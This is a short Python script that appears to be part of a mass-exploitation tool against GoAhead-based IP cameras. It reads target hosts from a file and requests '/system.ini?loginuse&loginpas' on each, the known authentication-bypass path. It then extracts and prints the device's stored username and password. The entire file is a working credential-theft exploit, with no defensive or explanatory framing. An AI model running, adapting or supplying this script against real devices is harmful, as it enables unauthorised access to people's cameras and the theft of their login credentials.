from http.client import RemoteDisconnected
from urllib.request import urlopen
import urllib.error
import os, sys, re , requests
import unicodedata
class goAhead:
	def goAheadExploit(self):
		path = os.path.abspath(os.path.dirname(sys.argv[0]))
		vulnerable_host = open(path + '/Host/up_host.txt', 'r').read().splitlines()
		pattern_1 = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
		pattern_2 = r'(\:).*'
		a = 0
		while a < len(vulnerable_host):
			try:
				res = vulnerable_host[a]
				match1 = re.search(pattern_1, res)
				match2 = re.search(pattern_2, res)
				target_host = match1.group()
				port_raw = match2.group()
				port = port_raw[1:]
				url = "http://" + target_host +":" + port + "/system.ini?loginuse&loginpas"
				f = urlopen(url)
				lines = f.read().decode(errors='ignore')
				splitted = []
				indexs = []
				for l in range(0, len(lines)):
					if unicodedata.category(lines[l])[0] != "C":
						indexs.append(l)
				word = ""
				for i in range(0, len(indexs)-1):
					if indexs[i] == indexs[i+1]-1:
						word += lines[indexs[i]]
					else:
						word += lines[indexs[i]]
						splitted.append(word)
						word = ""
				q = "Q"
				x =  [n for n,item in enumerate(splitted) if item==q]
				credIndex = x[1]
				username = splitted[credIndex + 1]
				password = splitted[credIndex + 2]
				print("[-]Found http://"+target_host + ":" + port + "  with credentials " + username +":"+ password)
			except AttributeError:
				pass
			except requests.exceptions.ConnectionError:
				pass
			except IndexError:
				pass
			except urllib.error.HTTPError:
				pass
			except urllib.error.URLError:
				pass
			except RemoteDisconnected:
				pass
			except TimeoutError:
				pass
			a += 1